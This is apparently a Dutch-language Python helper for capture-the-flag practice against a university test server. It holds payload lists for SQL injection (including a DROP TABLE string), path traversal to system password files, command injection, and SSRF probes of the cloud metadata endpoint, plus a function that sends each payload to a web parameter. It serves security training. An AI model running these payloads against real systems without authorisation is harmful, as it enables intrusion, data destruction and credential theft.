"""
WEB/API-KWETSBAARHEDEN — SNELLE TESTPAYLOADS
=================================================
WANNEER GEBRUIKEN?
  - Een HTTP-endpoint (zoals bij Token of Trust / Signed Sealed Misinterpreted)
    waarbij je niet meteen weet welke kwetsbaarheid bedoeld is.
  - Gebruik dit om SNEL door de meest voorkomende CTF-klassiekers te lopen.
"""
import requests


SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "admin'--",
    "' UNION SELECT NULL--",
    "1; DROP TABLE users--",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
]

COMMAND_INJECTION_PAYLOADS = [
    "; whoami",
    "| whoami",
    "`whoami`",
    "$(whoami)",
    "&& whoami",
]

SSRF_PAYLOADS = [
    "http://localhost/",
    "http://127.0.0.1/",
    "http://169.254.169.254/latest/meta-data/",  # cloud metadata endpoint
    "http://0.0.0.0/",
    "file:///etc/passwd",
]


def try_payloads_in_param(url: str, param_name: str, payloads: list[str],
                           method: str = "GET", base_params: dict | None = None):
    """Probeert elke payload in een specifieke parameter, print status+lengte."""
    base_params = base_params or {}
    for payload in payloads:
        params = {**base_params, param_name: payload}
        try:
            if method == "GET":
                r = requests.get(url, params=params, timeout=5)
            else:
                r = requests.post(url, data=params, timeout=5)
            print(f"[{r.status_code}] len={len(r.text):5d}  payload={payload!r}")
        except Exception as e:
            print(f"[ERR] payload={payload!r}  ({e})")


def check_response_headers(url: str):
    """Response headers bekijken -- vaak lekt dit framework/versie-info."""
    r = requests.get(url, timeout=5)
    print("Status:", r.status_code)
    for k, v in r.headers.items():
        print(f"  {k}: {v}")
    return r.headers


if __name__ == "__main__":
    # TODO: pas aan naar de echte URL/parameter van de opgave
    URL = "http://cns-test.idlab.uantwerpen.be:50007/vault"

    check_response_headers(URL)

    # try_payloads_in_param(URL, "id", SQLI_PAYLOADS)
    # try_payloads_in_param(URL, "file", PATH_TRAVERSAL_PAYLOADS)
    # try_payloads_in_param(URL, "url", SSRF_PAYLOADS)
